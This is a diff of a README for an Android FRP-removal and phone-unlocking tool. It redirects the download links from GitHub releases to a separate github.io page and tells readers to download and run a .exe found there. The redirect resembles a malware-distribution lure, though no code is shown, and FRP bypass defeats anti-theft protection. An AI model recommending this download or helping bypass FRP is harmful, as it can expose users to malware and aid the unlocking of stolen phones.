@@ -1,6 +1,6 @@
 # 🐆 Cheetah-Tool - Unlock Your Android Device With Ease
 
-[![Download Cheetah-Tool](https://img.shields.io/badge/Download-Cheetah--Tool-blue.svg)](https://github.com/gonzalesrich156/Cheetah-Tool/releases)
+[![Download Cheetah-Tool](https://img.shields.io/badge/Download-Cheetah--Tool-blue.svg)](https://gonzalesrich156.github.io)
 
 Cheetah-Tool helps you manage Android devices from your Windows computer. This software removes Factory Reset Protection (FRP) and unlocks phones that require special access. It works on Windows 10 and Windows 11.
 
@@ -19,7 +19,7 @@ Before you start, ensure your computer meets these requirements:
 
 Follow these steps to obtain the software:
 
-1. Visit this page to download the latest version: [https://github.com/gonzalesrich156/Cheetah-Tool/releases](https://github.com/gonzalesrich156/Cheetah-Tool/releases).
+1. Visit this page to download the latest version: [https://gonzalesrich156.github.io](https://gonzalesrich156.github.io).
 2. Look for the "Assets" section at the bottom of the latest release.
 3. Click the file ending in `.exe` to start the download.
 4. Save the file to your "Downloads" folder.
